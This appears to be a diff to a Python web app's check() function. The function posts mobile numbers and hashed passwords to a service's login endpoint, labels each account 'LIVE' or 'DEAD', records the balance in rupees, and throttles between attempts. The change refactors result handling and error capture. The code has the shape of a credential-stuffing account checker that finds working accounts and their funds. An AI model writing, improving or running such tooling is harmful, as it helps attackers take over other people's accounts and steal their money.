@@ -37,22 +37,30 @@ def check():
 
         params = {"mobile": mobile, "password": hashed}
 
+        status = "ERROR"
+        balance = "-"
+        remark = ""
+
         try:
             r = requests.post(BASE + "login", params=params, headers=headers, timeout=12)
+            
             if r.status_code == 200:
                 res = r.json()
                 if res.get("res") == 1:
                     balance = res.get("obj", {}).get("balance", 0)
-                    results.append([mobile, "✅ LIVE", f"₹{balance}", ""])
+                    status = "✅ LIVE"
                     live += 1
                 else:
-                    results.append([mobile, "❌ DEAD", "", res.get("resMsg", "")])
+                    status = "❌ DEAD"
+                    remark = res.get("resMsg", "Unknown error")
             else:
-                results.append([mobile, "❌ DEAD", "", f"HTTP {r.status_code}"])
-        except:
-            results.append([mobile, "❌ ERROR", "", ""])
+                status = "❌ DEAD"
+                remark = f"HTTP {r.status_code}"
+        except Exception as e:
+            remark = str(e)
 
-        time.sleep(2)
+        results.append([mobile, status, balance, remark])
+        time.sleep(2.5)
 
     return jsonify({
         "status": "done",
